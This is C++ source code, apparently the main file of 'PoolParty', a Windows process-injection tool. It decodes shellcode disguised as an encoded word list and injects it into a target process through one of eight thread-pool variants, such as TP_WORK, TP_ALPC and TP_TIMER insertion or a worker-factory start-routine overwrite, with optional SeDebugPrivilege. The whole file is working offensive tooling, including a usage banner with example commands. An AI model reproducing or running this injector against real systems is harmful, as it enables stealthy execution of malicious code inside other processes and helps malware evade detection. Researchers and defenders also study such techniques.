#include <iostream>
#include <vector>
#include <memory>
#include "Words.h"
#include "PoolParty.hpp"

unsigned char* g_Shellcode = nullptr;
size_t g_szShellcodeSize = 0;

void InitializeShellcode() {
    // Decode the encoded word list
    std::vector<unsigned char> decodedShellcode = Words::Decode(Words::EncodedWordList);

    // Copy the decoded shellcode to g_Shellcode
    g_szShellcodeSize = decodedShellcode.size();
    g_Shellcode = new unsigned char[g_szShellcodeSize];
    std::copy(decodedShellcode.begin(), decodedShellcode.end(), g_Shellcode);
}

void PrintUsage() {
    std::cout << "usage: PoolParty.exe -V <VARIANT ID> -P <TARGET PID>" << std::endl << std::endl <<
        "VARIANTS:" << std::endl <<
        "------" << std::endl << std::endl <<
        "#1: (WorkerFactoryStartRoutineOverwrite) " << std::endl << "\t+ Overwrite the start routine of the target worker factory" << std::endl << std::endl <<
        "#2: (RemoteTpWorkInsertion) " << std::endl << "\t+ Insert TP_WORK work item to the target process's thread pool" << std::endl << std::endl <<
        "#3: (RemoteTpWaitInsertion) " << std::endl << "\t+ Insert TP_WAIT work item to the target process's thread pool" << std::endl << std::endl <<
        "#4: (RemoteTpIoInsertion) " << std::endl << "\t+ Insert TP_IO work item to the target process's thread pool" << std::endl << std::endl <<
        "#5: (RemoteTpAlpcInsertion) " << std::endl << "\t+ Insert TP_ALPC work item to the target process's thread pool" << std::endl << std::endl <<
        "#6: (RemoteTpJobInsertion) " << std::endl << "\t+ Insert TP_JOB work item to the target process's thread pool" << std::endl << std::endl << std::endl <<
        "#7: (RemoteTpDirectInsertion) " << std::endl << "\t+ Insert TP_DIRECT work item to the target process's thread pool" << std::endl << std::endl << std::endl <<
        "#8: (RemoteTpTimerInsertion) " << std::endl << "\t+ Insert TP_TIMER work item to the target process's thread pool" << std::endl << std::endl << std::endl <<
        "EXAMPLES:" << std::endl <<
        "------" << std::endl << std::endl <<
        "#1 RemoteTpWorkInsertion against pid 1234 " << std::endl << "\t>>PoolParty.exe -V 2 -P 1234" << std::endl << std::endl <<
        "#2 RemoteTpIoInsertion against pid 1234 with debug privileges" << std::endl << "\t>>PoolParty.exe -V 4 -P 1234 -D" << std::endl << std::endl;
}

POOL_PARTY_CMD_ARGS ParseArgs(int argc, char** argv) {
    if (argc < 5) {
        PrintUsage();
        throw std::runtime_error("Too few arguments supplied ");
    }

    POOL_PARTY_CMD_ARGS CmdArgs = { 0 };

    std::vector<std::string> args(argv + 1, argv + argc);
    for (size_t i = 0; i < args.size(); i++) {
        auto CmdArg = args.at(i);

        if (CmdArg == "-V" || CmdArg == "--variant-id") {
            CmdArgs.VariantId = std::stoi(args.at(++i));
            continue;
        }
        if (CmdArg == "-P" || CmdArg == "--target-pid") {
            CmdArgs.TargetPid = std::stoi(args.at(++i));
            continue;
        }
        if (CmdArg == "-D" || CmdArg == "--debug-privilege") {
            CmdArgs.bDebugPrivilege = TRUE;
            continue;
        }
        PrintUsage();
        throw std::runtime_error("Invalid option: " + CmdArg);
    }

    return CmdArgs;
}

std::unique_ptr<PoolParty> PoolPartyFactory(int VariantId, int TargetPid) {
    switch (VariantId) {
    case 1:
        return std::make_unique<WorkerFactoryStartRoutineOverwrite>(TargetPid, g_Shellcode, g_szShellcodeSize);
    case 2:
        return std::make_unique<RemoteTpWorkInsertion>(TargetPid, g_Shellcode, g_szShellcodeSize);
    case 3:
        return std::make_unique<RemoteTpWaitInsertion>(TargetPid, g_Shellcode, g_szShellcodeSize);
    case 4:
        return std::make_unique<RemoteTpIoInsertion>(TargetPid, g_Shellcode, g_szShellcodeSize);
    case 5:
        return std::make_unique<RemoteTpAlpcInsertion>(TargetPid, g_Shellcode, g_szShellcodeSize);
    case 6:
        return std::make_unique<RemoteTpJobInsertion>(TargetPid, g_Shellcode, g_szShellcodeSize);
    case 7:
        return std::make_unique<RemoteTpDirectInsertion>(TargetPid, g_Shellcode, g_szShellcodeSize);
    case 8:
        return std::make_unique<RemoteTpTimerInsertion>(TargetPid, g_Shellcode, g_szShellcodeSize);
    default:
        PrintUsage();
        throw std::runtime_error("Invalid variant ID");
    }
}

void InitLogging() {
}

int main(int argc, char** argv) {
    InitLogging();

    try {
        const auto CmdArgs = ParseArgs(argc, argv);

        if (CmdArgs.bDebugPrivilege) {
            w_RtlAdjustPrivilege(SeDebugPrivilege, TRUE, FALSE);
            
        }

        // Initialize the shellcode
        InitializeShellcode();

        const auto Injector = PoolPartyFactory(CmdArgs.VariantId, CmdArgs.TargetPid);
        Injector->Inject();
    }
    catch (const std::exception& ex) {
        
        return 0;
    }

    return 1;
}
